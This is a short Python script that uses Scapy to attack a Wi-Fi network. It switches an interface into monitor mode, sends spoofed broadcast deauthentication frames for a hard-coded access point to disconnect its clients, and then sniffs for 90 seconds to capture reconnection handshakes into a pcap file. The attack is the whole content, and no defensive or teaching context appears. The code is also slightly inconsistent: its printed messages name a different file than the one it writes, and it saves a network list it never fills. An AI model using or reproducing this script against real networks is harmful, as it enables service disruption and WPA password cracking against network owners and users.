from scapy.all import *
import json
#import pyshark
import sys
import threading
import time

from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Elt, Dot11Beacon, Dot11ProbeResp, RadioTap
import os

os.system("sudo iwconfig wlan1 mode monitor")

def deauthenticate_network(bssid):
    pkt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid, addr3=bssid) / Dot11Deauth()
    sendp(pkt, iface="wlan1", count=5, inter=0.1, verbose=True)

def packet_handler(pkt):
    
    
    # Capture all packets without filtering
    handshakes.append(pkt)  # Store the entire packet
    print("Packet captured:", pkt.summary())

# Example usage:
# sniff(prn=packet_handler)  # Use Scapy's sniff function to capture packets and call packet_handler for each packet

deauthenticate_network(bssid = "AC:64:62:8E:23:90")
# List to store network data and captured handshakes
networks = []
handshakes = []

# Sniff Wi-Fi packets
sniff(iface="wlan1", prn=packet_handler, timeout=90)

# Write captured handshakes to a pcap file
wrpcap("hana.pcap", handshakes)

print("Captured handshakes saved to captured.pcap")

# Write network data to JSON file
with open("network_data.json", "a") as json_file:
    json.dump(networks, json_file, indent=4)

print("Network data saved to network_data.json")

# Call the function deauthenticate_network